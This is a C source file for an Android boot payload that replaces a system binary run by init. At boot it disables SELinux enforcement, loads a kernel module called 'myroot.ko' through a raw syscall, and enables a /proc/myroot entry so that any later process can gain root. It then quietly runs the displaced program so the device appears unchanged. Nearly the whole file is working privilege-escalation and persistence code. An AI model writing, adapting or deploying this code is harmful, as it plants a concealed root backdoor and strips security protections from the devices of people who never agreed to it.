/* bootpayload.c - runs at boot from init, in the init domain.
 *
 * init execs this path directly (it replaces /system/bin/mrdloader, which
 * /init.tel.rc runs from `on post-fs-data`). A binary whose label is
 * system_file keeps the child in the init domain: no type transition, and no
 * need for /system/bin/sh. A shell script cannot work here, because init would
 * have to exec shell_exec and its own domain is denied that.
 *
 * It does three things, then hands control back to the program it displaced:
 *
 *   1. write 0 to /sys/fs/selinux/enforce
 *   2. init_module(/system/lib/modules/myroot.ko)
 *   3. write 1 to /proc/myroot  (so any later process can become root)
 *
 * Logging is deliberately redundant. At post-fs-data /data may not be mounted
 * yet, so the first choice is /tmp (a tmpfs created by `on fs`), and every
 * message also goes to /dev/kmsg where dmesg can see it.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define TAG "CHAREPA_BOOT: "

static int kmsg = -1;

static void log_line(const char *s)
{
    if (kmsg >= 0) {
        ssize_t r = write(kmsg, s, strlen(s));
        (void)r;
    }
}

static void say(const char *fmt, ...)
{
    char b[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);

    /* dmesg */
    log_line(TAG);
    log_line(b);
    log_line("\n");
}

int main(int argc, char **argv)
{
    static const char *paths[] = {
        "/data/misc/charepa_boot.txt",    /* /data is up by post-fs-data */
        "/tmp/charepa_boot.txt",          /* tmpfs, mounted by `on fs` */
        "/data/local/tmp/charepa_boot.txt", /* mounted by `on post-fs-data` */
        "/dev/charepa_boot.txt",
        NULL
    };
    char tmp[1024];
    int first_ok = -1;

    kmsg = open("/dev/kmsg", O_WRONLY);

    say("start pid=%d uid=%d argc=%d", getpid(), getuid(), argc);

    {   /* who are we, really */
        char ctx[256] = {0};
        FILE *f = fopen("/proc/self/attr/current", "r");
        if (f) { if (fgets(ctx, sizeof ctx, f)) {} fclose(f); }
        snprintf(tmp, sizeof tmp, "context=%s", ctx);
        say("%s", tmp);
    }

    /* 1. SELinux */
    {
        int f = open("/sys/fs/selinux/enforce", O_WRONLY);
        if (f < 0) {
            snprintf(tmp, sizeof tmp, "open enforce: errno=%d (%s)", errno, strerror(errno));
            say("%s", tmp);
        } else {
            ssize_t w = write(f, "0", 1);
            snprintf(tmp, sizeof tmp, "write enforce=0 rc=%zd errno=%d", w, errno);
            say("%s", tmp);
            close(f);
        }
    }

    /* 2. the module */
    {
        int f = open("/system/lib/modules/myroot.ko", O_RDONLY);
        if (f < 0) {
            snprintf(tmp, sizeof tmp, "open myroot.ko: errno=%d (%s)", errno, strerror(errno));
            say("%s", tmp);
        } else {
            struct stat st;
            fstat(f, &st);
            char *buf = malloc(st.st_size);
            ssize_t n = read(f, buf, st.st_size);
            close(f);
            errno = 0;
            long rc = syscall(105, buf, (unsigned long)n, "");
            snprintf(tmp, sizeof tmp, "init_module rc=%ld errno=%d (%s) bytes=%zd",
                     rc, errno, strerror(errno), n);
            say("%s", tmp);
            free(buf);
        }
    }

    /* 3. the durable entry point */
    {
        int f = open("/proc/myroot", O_WRONLY);
        if (f < 0) {
            snprintf(tmp, sizeof tmp, "open /proc/myroot: errno=%d (%s)", errno, strerror(errno));
            say("%s", tmp);
        } else {
            ssize_t w = write(f, "1", 1);
            snprintf(tmp, sizeof tmp, "write /proc/myroot rc=%zd errno=%d uid now %d",
                     w, errno, getuid());
            say("%s", tmp);
            close(f);
        }
    }

    say("payload done");

    /* now leave the same text somewhere persistent, for later reading */
    {
        const char *p;
        int i;
        for (i = 0; paths[i]; i++) {
            int fd = open(paths[i], O_CREAT | O_TRUNC | O_WRONLY, 0644);
            if (fd < 0) continue;
            if (first_ok < 0) first_ok = i;
            dprintf(fd, "ran: uid=%d argc=%d\n", getuid(), argc);
            close(fd);
            break;                      /* one file is enough */
        }
        p = i >= 0 && paths[i] ? paths[i] : "(no path)";
        say("wrote marker to %s", p);
    }

    /* hand off to the program we displaced, so nothing else changes */
    {
        char real[512];
        snprintf(real, sizeof real, "%s.real", argv[0]);
        if (access(real, X_OK) == 0) {
            pid_t p = fork();
            if (p == 0) {
                int i;
                char **av = calloc(argc + 1, sizeof(char *));
                av[0] = real;
                for (i = 1; i < argc; i++) av[i] = argv[i];
                execv(real, av);
                _exit(127);
            } else if (p > 0) {
                int st;
                waitpid(p, &st, 0);
            }
        } else {
            say("no %s to hand off to", real);
        }
    }
    if (kmsg >= 0) close(kmsg);
    return 0;
}
